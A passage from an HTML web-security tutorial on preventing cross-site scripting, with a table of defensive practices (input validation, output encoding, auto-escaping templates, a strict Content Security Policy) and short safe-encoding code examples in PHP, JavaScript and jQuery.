                        <th>Practice</th>
                        <th>Description</th>
                        <th>Implementation</th>
                    </tr>
                </thead>
                <tbody>
                    <tr>
                        <td>Input Validation</td>
                        <td>Validate all user inputs</td>
                        <td>Use regex patterns and whitelist validation</td>
                    </tr>
                    <tr>
                        <td>Output Encoding</td>
                        <td>Encode data before output</td>
                        <td>HTML encode, JavaScript encode, URL encode</td>
                    </tr>
                    <tr>
                        <td>Template Engines</td>
                        <td>Use safe template engines</td>
                        <td>Mustache, Handlebars with auto-escaping</td>
                    </tr>
                    <tr>
                        <td>Content Security Policy</td>
                        <td>Implement strict CSP</td>
                        <td>script-src 'self'; object-src 'none'</td>
                    </tr>
                </tbody>
            </table>
            
            <h3 class="subsection-title">Code Examples</h3>
            <div class="code-example">
                <code>
                    // PHP - HTML encoding
                    echo htmlspecialchars($userInput, ENT_QUOTES, 'UTF-8');
                    
                    // JavaScript - Text content
                    element.textContent = userInput;
                    
                    // jQuery - Safe HTML
                    $element.html($('&lt;div&gt;').text(userInput).html());
                </code>
            </div>
        </div>
    </div>

    <script src="script.js"></script>
</body>
</html>